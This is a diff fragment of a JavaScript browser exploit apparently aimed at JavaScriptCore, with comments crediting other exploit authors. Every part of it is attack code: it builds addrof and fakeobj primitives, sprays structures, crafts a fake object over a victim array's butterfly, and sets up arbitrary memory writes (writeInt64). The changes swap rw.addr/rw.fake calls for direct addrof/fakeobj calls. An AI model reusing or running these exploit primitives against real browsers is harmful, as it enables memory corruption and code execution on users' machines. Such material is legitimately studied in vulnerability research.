@@ -524,7 +524,7 @@ var VM_PROT_EXECUTE = 0x4
                 addr: function(obj) {
                     addrof(obj)
                 },
-            }
+            };
             port.postMessage("We got stableish addrof and fakeobj");
             // from saelo: spray structures to be able to predict their IDs.
     // from Auxy: I am not sure about why spraying. i change the code to:
@@ -557,7 +557,7 @@ var VM_PROT_EXECUTE = 0x4
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
     
-    print("[+] victim @"+rw.addr(victim));
+    print("[+] victim @"+addrof(victim));
 
     // craft a fake object to modify victim
     var flags_double_array = new Int64("0x0108200700001000").asJSValue();
@@ -567,10 +567,10 @@ var VM_PROT_EXECUTE = 0x4
     };
 
     // create object having |victim| as butterfly.
-    var containerAddr = rw.addr(container);
+    var containerAddr = addrof(container);
     print("[+] container @"+ containerAddr);
     // add the offset to let compiler recognize fake structure
-    var hax = rw.fake(containerAddr + 0x10);
+    var hax = fakeobj(containerAddr + new Int64(0x10));
     /*var maxtry = 0;
     if (hax instanceof Array) {
             print("got fakeobj with real struct id");
@@ -592,8 +592,8 @@ var VM_PROT_EXECUTE = 0x4
     var origButterfly = hax[1];
 
     var memory = {
-        addrof: rw.addr,
-        fakeobj: rw.fake,
+        addrof: addrof,
+        fakeobj: fakeobj,
 
         // Write an int64 to the given address.
         writeInt64: function(addr, int64) {
